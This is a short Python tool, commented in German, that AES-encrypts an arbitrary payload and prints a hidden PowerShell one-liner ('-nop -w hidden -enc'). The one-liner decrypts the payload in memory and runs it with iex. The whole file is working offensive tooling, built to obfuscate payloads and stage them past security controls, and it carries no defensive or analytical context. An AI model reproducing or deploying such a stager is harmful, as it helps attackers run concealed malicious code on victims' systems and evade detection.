import argparse
import base64
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Funktion zur Generierung eines zufälligen Schlüssels
def generate_random_key():
    return os.urandom(32)  # 256-bit Key

# Funktion zum Generieren eines IVs
def generate_iv():
    return os.urandom(16)  # 128-bit IV

def encrypt_payload(payload, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(payload.encode(), AES.block_size))
    return base64.b64encode(encrypted).decode()

def generate_powershell_oneliner(encrypted_payload_b64, key_b64, iv_b64):
    oneliner = f"powershell -nop -w hidden -enc "
    ps_script = f'''
    $Key = [Convert]::FromBase64String(\"{key_b64}\")
    $IV = [Convert]::FromBase64String(\"{iv_b64}\")
    $Encrypted = [Convert]::FromBase64String(\"{encrypted_payload_b64}\")
    $AES = New-Object System.Security.Cryptography.AesManaged
    $AES.Mode = \"CBC\"
    $AES.Padding = \"PKCS7\"
    $AES.KeySize = 256
    $AES.BlockSize = 128
    $AES.Key = $Key
    $AES.IV = $IV
    $Decryptor = $AES.CreateDecryptor()
    $MemoryStream = New-Object System.IO.MemoryStream(,$Encrypted)
    $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemoryStream, $Decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)
    $StreamReader = New-Object System.IO.StreamReader($CryptoStream)
    $PlainText = $StreamReader.ReadToEnd()
    iex $PlainText
    '''
    ps_script_bytes = ps_script.encode('utf-16le')
    ps_script_b64 = base64.b64encode(ps_script_bytes).decode()
    return oneliner + ps_script_b64

def main():
    parser = argparse.ArgumentParser(description="AES Payload Encryptor with Random Key Generation and PowerShell Oneliner Generator")
    parser.add_argument("-p", dest="payload", required=True, help="Payload to encrypt")
    args = parser.parse_args()

    key = generate_random_key()
    iv = generate_iv()
    encrypted_payload = encrypt_payload(args.payload, key, iv)
    key_b64 = base64.b64encode(key).decode()
    iv_b64 = base64.b64encode(iv).decode()

    print("[+] AES Encrypted Payload:")
    print(encrypted_payload)
    print("\n[+] PowerShell Oneliner:")
    print(generate_powershell_oneliner(encrypted_payload, key_b64, iv_b64))

if __name__ == "__main__":
    main()
